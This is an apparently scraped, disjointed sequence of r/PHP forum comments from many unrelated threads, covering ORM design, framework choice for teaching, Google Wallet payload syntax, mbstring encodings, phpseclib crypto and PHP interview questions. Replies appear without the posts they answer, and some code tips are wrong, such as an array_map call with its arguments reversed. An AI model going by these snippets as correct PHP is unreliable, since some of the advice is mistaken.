Well, I can't think of a really elegant solution, but you can at least pack both versions in the same array: &lt;?php $module = array( 'Today is date("Y/m/d")'=&gt;"Today is " . date("Y/m/d"), 'Today is date("Y.m.d")'=&gt;"Today is " . date("Y.m.d"), 'Today is date("Y-m-d")'=&gt;"Today is " . date("Y-m-d"), 'Today is date("l")'=&gt;"Today is " . date("l"), ); ?&gt; &lt;?php foreach ($module as $key=&gt;$value) { ?&gt; &lt;div class = "panel panel-default"&gt; &lt;div class = "panel-body panel-input"&gt; &lt;!-- need to be raw php --&gt; &lt;?php echo "$key&lt;br&gt;"; ?&gt; &lt;/div&gt; &lt;div class="panel-body panel-output"&gt; &lt;!-- need to be not raw php --&gt; &lt;?php echo "$value &lt;br&gt;"; ?&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php } ?&gt;
I couldn't find the patch and I'm not familiar with the code. It seems that whatever is compiled to SQL should fail as an ORM operating on entities would never not have a where clause. I.e. a bug that empties tables shouldn't exist in this case. At any rate, I'm speculating. &gt;I personally think there's no good bad choice. Thanks for replying, you make good points. And you're right, good or bad does require some context, I'd rather people used Laravel than nothing at all. But you also back up my position in that you use the Laravel method but drift towards the Symfony way of doing things over time. It just bugs me that the hacky way of doing things is the poster boy for PHP frameworks, and most, unlike yourself, will never understand what's wrong. But then again, PHP is only popular because of it's quick and dirty way of doing things ... 
We used Yii at my previous job, and I liked it a lot, especially how relations were done. Is there something i can read about what exactly is wrong with activeRecord?
http://php.net/manual/en/function.eval.php
Well, for example, ActiveRecord requires [breaking the SOLID principles](http://en.wikipedia.org/wiki/SOLID_\(object-oriented_design\)). You end up mingling the code to save and retrieve an entity inside the entity object itself. The entity object becomes permanently tied to the system that gave it birth, and it directly ties it to the underlying storage mechanism. Other patterns, like Data Mapper and Table / Row Data Gateway allow you to detach the storage mechanism and the system that stores/retrieves entities from the entities themselves. This reduces the complexity of the entities and helps you towards achieving the [Single Responsibility Principle](http://en.wikipedia.org/wiki/Single_responsibility_principle). FWIW, it's perfectly fine to not give a crap about SOLID, as long as you're aware of the design pitfalls of the thing you're using. If you know ActiveRecord sucks because it adds complication to your entities, then that's fine. But it doesn't have to be that way...
If the methods are static, you can no longer control from a central point who uses what.
The buy now - read when I've bothered to finish it in a few years model.
 While teaching them PHP is a good sidetrack the main goal with the education is to teach them JAVA and theres a Python course aswell, and php is just that, a sidetrack. The project is off-hours and the students signed up on free will so i probably wont have time to actually teach them the basis of the language even if i'd like to. 
rocket uses the framework that most people can code in at that time, in germany nowadays its mostly zend or laravel
http://ch1.php.net/manual/en/ref.array.php
Hey, no worries. I realize with all the PHP7 stuff going on, you guys are all very busy. Maybe the PR merging stuff could be put on rotation? Something like 1 week per person?
Please, take a step back and consider why you are getting so much negative karma for this idea.
You didn't have to make a drama, you choose to make a drama, you choose to use provocative language, a lot of the time approaching offensive even. In almost every communication I have read from you, that's how you behave. Sure, I bite sometimes, maybe I shouldn't .... whatever, human ... I'm approaching the problems and questions you are raising with considerable knowledge of how PHP actually works, and obviously in my head some idea of how I would like it to work; whatever I might be, I am not a novice ;) &gt; Lack of willingness to take everything into consideration I'm not disputing that it might be correct to stop this method being called, but, I (we actually), don't see a distinction between clone and other magic methods. So knowing that there are differences is how this method behaves, and knowing that other magic methods might do similarly strange things if you called them from userland too, knowing that this highlights a problem that we are bound to make similar breaks in future, I acknowledge that we probably should stop these methods being called, that we cannot and should not be implicitly agreeing to retain backwards compatibility for magic, that we probably do need a way to make that distinction between code intended to only ever be called by the engine and normal code. It sounds to me like we need something way more robust than a compiler hack that only works some of the time on a single method, like I said before, I could totally go for a patch to the executor that stopped these methods being called. What Nikita was engaged in was refactoring the compiler, it really wouldn't have made sense if he had copied the hack, what does make sense is someone coming along with a patch that really solves the problem. We have plenty of time for that to happen, maybe it could be your first patch ;)
I probably wouldn't use any of the full stack frameworks. You said in one of your replies that this is only a very brief into to PHP web development and if you start teaching symfony, zend or laravel etc. it'll be hours of setup and explanation before a single line of code is executed. I would recommend Silex or Slim or one of the other micro frameworks. These touch on the same concepts as the full stack e.g. routing, controllers, views and so on but don't get bogged down in so many of the more advanced implementation details. You could represent a high percentage of the basic components of a PHP web application in only a few lines of code with Silex: //service locator //factory $app['my.service'] = function($app) { //dependency injection return new \SomeService($app['db']); }; //http //routing //controller //request/response cycle $app-&gt;get('/foo', function(Request $request) { return new JsonResponse(array('some'=&gt;'thing')); }); Furthermore Silex resembles Express much more closely so if you did a followup using MEAN I think it would be a lot easier to draw parallels. Not to mention that Silex is similar to Flask which could tie back into the Python thread of the course.
If you're looking to build CRUD interfaces quickly with a PHP framework, Yii comes up: http://stackoverflow.com/questions/3607288/php-rapid-skeleton-generator-for-basic-crud There's also a lot of pre-built stuff that makes things easier: http://www.yiiframework.com/extensions/ I think those two things make it a logical choice. 
man in php 5.5. You have an special function to this kind of use. is called array_column http://ch1.php.net/manual/en/function.array-column.php
You're not doing anything with the result of the recursive call to bar (line 5) so it'll just get lost. maybe replace {bar($value);} with something like: $foo = array_merge($foo, bar($value)); but are you sure you need recursion here? Can groups have groups if not then just process the array in a more simple fashion. $foo = array_filter(array_map($orgArr, function ($val) { return isset($val['groupName']) ? $val['groupName'] : null; }));
Dayum! Thatll teach him xD
The majority of your points seem to come back to the idea that the members of the group MUST implement the standards they propose or presumably get ousted from the group. This sounds kind of draconian (or should that be dracony-an) and I think it would prevent such a group from ever gaining traction. FIG only works because it's quite a light touch approach. They recommend things and you can follow them or not. There are incentives to following the standards (e.g. a lot of things now follow the logger interface so you can use a single log implementation across all your third party components as well as your own code) but it accepts the reality of the situation: making significant changes to large projects is really hard and takes a long time.
You seem to have some vitriolic hatred towards codeigniter, I would recommend that you educate yourself before you post in reddit. Like others have pointed out, codeigniter is merely outdated, but it is probably one of most beautifully written and cleanest PHP projects of its day, and is a testament to the developers who designed and created it. I would urge you to take a dive into the codeigniter source code, you might learn some more about PHP, and you will certainly learn to appreciate its beauty.
FYI: closing brackets do not need to be terminated. since PHP does allow empty statements, it does not complain. but nobody does this, so for consistency, I wouldn't make a habbit of it.
EDIT: Ew, this looks terrible in comment, here's pastebin that is easier on the eyes: http://pastebin.com/yTJ0Lgin Thanks, but I'm normally not a PHP guy. This was one of the templates from Google. Actually, EVERYTHING except $payload-&gt;AddProperty('recurrence',{ 'price' : '4.99', 'currencyCode' : 'USD', 'startTime' : time(), 'frequency' : 'monthly', 'numRecurrences' : '12' }); is actually from the template. Somehow I need to add the above code onto the next line. Without it, it works as an "item" rather than a "subscription". I am simply trying to make it a 'subscription'. I'm not sure how to add this as PHP style, so I keep trying different things. I'm more of a .NET person, but my hosting doesn't allow it, so I'm forced with PHP. Anyway, anyone here familiar with Google Wallet implementation? This may look familiar.. I just need to make it a subscription instead. On payload.php, I changed the "typ" to subscription, like instructed on Google's guide (commented out the original): //const TYPE = "google/payments/inapp/item/v1"; const TYPE = "google/payments/inapp/subscription/v1"; 
The indentation makes it hard to see, but it looks like you're returning $foo inside foreach? That would make your function return $foo on the first iteration. Try moving that right before the last braket.
LOL, I read "I wouldn't make a hobbit of it"
&gt; you choose to use provocative language, a lot of the time approaching offensive even. Ha ha, you asked me to "stop talking shit" and "that I am a stranger on the internet", so I do not deserve a fair discussion. did you not? Now you accuse me of using provocative language? &gt;I'm not disputing that it might be correct to stop this method being called, but, I (we actually), don't see a distinction between clone and other magic methods. I am not sure what to make of that sentence. Does it mean, "you may be right, but we don't see it that way"? Anyway, I don't see much point in continuing this discussion, I just hope you guys are on the right path...
Yes we probably do at work. It's just an integration test. When you test you should have tests for this. It's not uncommon to check false cases when testing. Also, you don't have to even test it everywhere to find the issue. Just one place that catches it would let you know the behavior is weird and maybe you should review wherever you use it.
&gt;Doesn't use Composer So? he must use composer?
Guys, thank you, but I don't care about composer or autoloaders -- I already said it works 100% as an item, just not as a subscription with that extra chunk of code I added. I don't know much about PHP and really don't care too much about fine-tuning it: This is what Google gave me as the sample, minus the extra code at the end I'm trying to properly format, and this is the code I'm gonna use :P once it gets to Google's API and triggers what it needs to do, then the rest isn't PHP at all. Is anyone here even familiar with Google Wallet or am I just being trolled by proper-procedure-nazis? O__o *All I would like is proper syntax for 'recurrence' on Line 50*
Best comment ever.
[Here is what the guy who deleted his shit wrote](http://i.imgur.com/SfOXSD4.png)
Apologies, I misread your question as seeking general advice rather than seeking a particular solution. Removed my comment as it wasn't relevant. I'm not familiar with Google Wallet unfortunately so can't help you out there!
I thought the first points were helpful, was going to post a reply so I still had it up. 
Jesus, Quora. Fuck that site. Why do people still use it?
Yii 2 was released just last week.
Short array syntax is `[` ... `]` and not `{` ... `}`. If you turn on error reporting, you'd get a `Parse error: syntax error, unexpected '{' in ... on line ...`.
You did get it wrong. phpseclib uses mcrypt if it is available and it's own implementation if mcrypt is *not* available.
Using that is a bad idea. Look at https://github.com/jasonhinkle/php-gpg/blob/master/libs/GPG/AES.php. Pure-PHP AES and as per http://www.reddit.com/r/PHP/comments/2i7483/help_with_public_key_encryption/ckzgktn pure-PHP implementations of anything suck.
Here's what openssl_seal is doing internally: http://phpseclib.sourceforge.net/interop.html#seal,p1phpseclib,p2openssl So if you want to use something like openssl_seal / openssl_open but with AES use phpseclib's re-implementation, replacing Crypt_RC4 with Crypt_AES. 
Because I never heard of it probably. Got a link?
&gt; Did nobody try to run it before upvoting? Making a logical observation = some kind of bad attitude? That makes no sense. It still hasn't been corrected.
Ok, it turns out I already have mbstring.internal_encoding = UTF-8 in my php.ini, so in this case I was right in thinking I don't have to call mb_internal_encoding() at all 
Your crimes will not be forgotten.
&gt; Is there a way that would prevent me from writing it twice If you use the second array ($moduleString) and you echo it first, then you can echo the eval of it. But, I'd strongly recommend against this for any production site. However, if it's only run locally, there's little to harm. Just warning you, don't use eval in production. 
Basically, mbstring makes some assumptions: * All your input (from HTTP etc) is in input_encoding * All your strings within your application are in internal_encoding * All your output (to HTTP etc) is in output_encoding mbstring will automatically convert input from input_encoding to internal_encoding, and output from internal_encoding to output_encoding. internal_encoding is also what it uses for string manipulation. What you probably want is to make all three of these encodings be UTF8, so it won't do any conversion. But theoretically, your app can take in Latin-1, use UTF8 internally, and output Shift-JIS if you really want that.
What is your measure of "bad practice"?
My company runs an internal jabber server. When I was developing our time clock system, I used it to alert our employees to turn off their clocks before breaks/lunch/EoD. It works perfectly for what we need. However, I really like your idea as well. I will bring this up on Monday. 
Doesn't Yo just say "yo", not a customized message? 
http://www.codecademy.com/en/tracks/php
In that case I wouldn't even bother teaching them PHP. Your students will have to unlearn bad habits when they start learning Java. Or maybe teach them Symfony, which is more in line with the practices used by Java frameworks, such as Spring.
The second number is actually an octal number (and its decimal equivalent is 9). Binary uses "0b" in front.
I think you were just hired. 
&gt; the lonely AuraPHP booth Funny, it doesn't *feel* lonely, what with 70+ contributors across all the packages: http://auraphp.com/community
That's the one. Currently cross compiling it from OS/2.
It depends on your project size 
I don't think questions like this are that important (depending on what you would be hired to do of course). But they do give an idea of your general knowledge in the language, and are somewhat of a proxy to your experience in PHP, even if they aren't generally useful in web development. For more information about integers, read http://php.net/manual/en/language.types.integer.php 
first question is stupid the second was meant to check if you are aware of octal an hex numbers. not that useful but a valid question third is not that bad of a question. if you know basic mysql you should be aware of what happens (it just auto increments the column value) overall I dislike this kinds of questions, a good test would check if you can think, how good you are at problem solving
Filler question from me: Why do they include the php opening tag &lt;?php in question 2, but a closing tag at question 1. I mean, if you're gonna include them, include both or neither. So my answer to question 1 is no. That code is not valid simply because php isn't opened properly. 
The good thing about our industry is you can tell if your new team are lead by idiots in the interview. Move on.
i wouldn't mind if some of these came up, together with some easy ones. but if all questions were like these, then thats just weird...
You should tag the issue # in your commits so that it shows up on the issues page. That would be nice.
It very interesting idea . would like to hear more abut implementing xmpp in php. And some use cases. Can you provide some more information, links about it?
I'm aware of it yes. Was nitpicking a bit.
You're right. I took a dig at the wrong thing, I apologize. I edited my comment to reflect that.
The questions I knew the answers to were perfectly reasonable questions to ask. The questions I didn't know the answer to were ridiculous trick questions that had no part of an interview. Joking aside, a lot of tech interviews are bad. Documentation quizzes: bad. [Guess the optimal algorithm that took decades to figure out](http://www.nomachetejuggling.com/2014/06/24/the-worst-programming-interview-question/): bad. [Brain teasers](http://hebig.org/blog/003029.php): bad. Better questions are ones that allow the candidate to demonstrate what they've done (even if just in school) and their ability to learn new things. I'd rather have a PHP candidate that doesn't know PHP but has a track record of delivering projects in new languages, over a candidate who had no projects under their belt but the php.net documentation memorized.
Congratulations, Paul! Having worked with Zend and Symfony I am pleased to say Aura gains the distinction of Least Shit PHP Framework 2014. I hope you have the strength and vision to ensure it stays that way in the future.
https://i.imgur.com/WQwKNG9.jpg
These questions are perfectly fine depending on the team and product. These are not junior-level questions unless the dev team is small (4 or fewer). They seem to be looking for an experienced PHP developer and I think all of these questions are fair game. To be fair, the first one is a tricky, but it would not be an outright failure on an interview if you missed. On the other hand, not knowing the 'i' in various string functions in PHP is simply dumb (maybe you do not know that particular function, but you SHOULD know that i = case insensitive for PHP functions). Not knowing how numbers are interpreted in your language is also dangerous. The database question is entry level for DBs. If we are working with SQL I would expect you to know that. If they are working on an in-house product (not simply some dev shop) then I would expect you to know all of these. Too risky and dangerous otherwise.
011 isnt binary, its octal. few weeks ago i had some weird error codes in application i was working on because another dev defined error codes like 0222, 0234 next to 1212. Just to make it 4-digit, like the others. Binaries are 0bXXX, f.e. 0b10101. Questions like that doesnt say much about interviewed person skills. But if there are many other normal questions in the mix then they are fine - checking your deeper knowledge of language and intuition. `What would be the result of trying to insert a NULL value inside an auto-increment column?` well, you always put it there when you are not specifing it in query.
Thanks for that clarification, though it was a bit of a strong response. :) IMO, the pure PHP implementation should only be enabled *if* the user toggles it on. Basically, the issue with "novel" implementations of crypto is that it is possible/probable for them to "leak" cipher details ([see this](http://en.wikipedia.org/wiki/Side_channel_attack)). As I understand it, there is also the potential for them to accidentally leak secrets in the ciphertext format, depending on the exact algorithm used. mcrypt, as I understand it, has had a long period of time where it has been tested, reviewed and patched. The same cannot necessarily be said of phpseclib. I am of course not a cryptographer, so I may be entirely wrong.
"They appear to be looking for an experienced PHP developer" really? You make *that* conclusion on those questions? Wheres the questions about dependency injection, service providers, composer/dependency managers, difference between abstract classes and traits (and when to use them), interfaces, test driven development, build tools (when is appropriate to use them). Out of all of the possible questions they ask; "is this file syntax correct?" -- "can you read octal and hex and do the math?" -- "have you ever tried putting null in an autoincrement? then we're not interested in hiring you." -- "do you know your php functions off by heart" (who does?). Utterly stupid and personally I wouldn't want to work for a company that is basically saying that is the benchmark for deciding if someone can work for a company.
No, those aren't equal, but the way you are commenting is pretty negative.
Syntax questions are universal. Asking if they know how to use composer and build tools is NOT. Unless it is just some dev shop (as I already qualified), it is typically not possible to just throw on another library for the purposes of the code that you are developing. I certainly would not allow a developer to do it (talk about bloat). The syntax questions are fair compared to the questions you proposed, which are largely one-off project type questions (such as found in dev shops or by freelancers). And I would expect such a test to also include OO components as well (maybe they did?).
You're only seeing the questions OP decided to post. They could have asked numerous perfectly valid questions too but he didn't post because they wouldn't support his case of unfairness.
The first question is actually applicable because it pertains to encapsulation which in a large codebase is extremely important. The last questions are definitely pedantic, especially the one with the hex value. I've been coding PHP for 5 years I've never seen, or needed to use hex values ever. Normally when I interview people I more importantly try to gauge their organizational skills, it's much more important to me that their code be readable and follow proper SE conventions than that they have these particular edge cases memorized. What's the point if you can just 'php -a' to find the answer?
All of these questions are completely retarded and have nothing to do being a useful or productive web developer. I've been working with PHP for 8 years and have been a professional PHP developer in an agency environment for 3 years, and I couldn't answer a single one of those questions. Yet, despite never having used `strstr` or tell you what the difference between `strstr` and stristr` are, I can deliver and deploy a high quality site that adds tremendous business value to a client from start to finish. I personally would not waste my time with this company.
Yep. These are all stupid questions. This means with certainty that the people who wrote the questions in the first place are shitty programmers, because they are not capable of asking sensible technical questions that can help them gauge how good a programmer a prospective candidate is. I bet these people think they're really clever, and their code is a pile of shit.
Congratulations on the release! 
&gt; I'm quite aware of what happens. That's the main reason I didn't ever try to insert anything into an AI field. --- &gt; Again, I had no clue simply because I have never tried to insert something inside a freaking AI field. --- Which one is it?
Why would you need to know 1 and 2 for PHP though....
I really don't see how my questions are 'unfair' compared to the ones in the OPs questions. I assumed that it was an interview for a Web Developer position (maybe it's not, but PHP tends to be for some kind of web job, though I could be wrong for the OP). In any case having knowledge of package management, PSR autoloading, namespaces, and build tools is an extremely good indication of an experienced PHP dev, compared to those questions that have been asked at least. Let's put it this way; the questions that have been asked could make a seasoned developer for Github stumble. Does that mean they are not a good match, and the interview didn't go well? No. These questions are not really finding out what kind of PHP developer they are; do they write procedural code? Object-orientated? Do they keep up with trends (i.e. PHP traits and dependency injection). Are they aware of good design decisions, KISS principles and separation of concerns? You want to ask questions to see if they are good problem and what kind of code they will write. These questions are ridiculous and do nothing to give any indication of this.
&gt; led by FTFY 
Nope. These questions are stupid - even if you can answer all of them 100% correctly, it still tells you absolutely NOTHING about how good a programmer you are. A terrible programmer could score 100% answering these questions, and a great programmer could get them all wrong. &gt;Difference between strstr and stristr? Answer: who gives a fuck? Google it.